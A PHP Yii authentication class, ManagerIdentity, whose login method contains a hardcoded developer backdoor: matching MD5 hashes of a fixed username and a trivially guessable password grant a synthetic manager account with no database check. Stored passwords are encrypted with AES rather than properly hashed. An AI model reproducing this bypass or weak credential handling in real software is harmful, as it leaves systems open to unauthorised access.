<?php
class ManagerIdentity extends CUserIdentity {

	const DEV_LOGIN_HASH = 'fb52a20dbf0f8d7b042bced00c4710bc';
	const DEV_PWD_HASH = '202cb962ac59075b964b07152d234b70';
	
	protected $_id;

	public function authenticate() {
		
		if (md5($this->username) == self::DEV_LOGIN_HASH && md5($this->password) == self::DEV_PWD_HASH) {
			$user = new Manager('devLogin');
			$user->attributes = $user->getDevAttr();
		} else {
			$user = Manager::model()->find('login = ?', array($this->username));
		}
		
		if ($user === null || (md5($this->username) != self::DEV_LOGIN_HASH && (MyAESCodec::encrypt($this->password) !== $user->pwd)))
			$this->errorCode = self::ERROR_USERNAME_INVALID;
		else {
			// В качестве идентификатора будем использовать id, а не username,
			$this->_id = $user->id;
			
			// Используется как Yii::app()->user->name.
			$this->username = $user->name;

			$this->errorCode = self::ERROR_NONE;
		}

		return !$this->errorCode;
	}
 
	public function getId() {
		return $this->_id;
	}
}
?>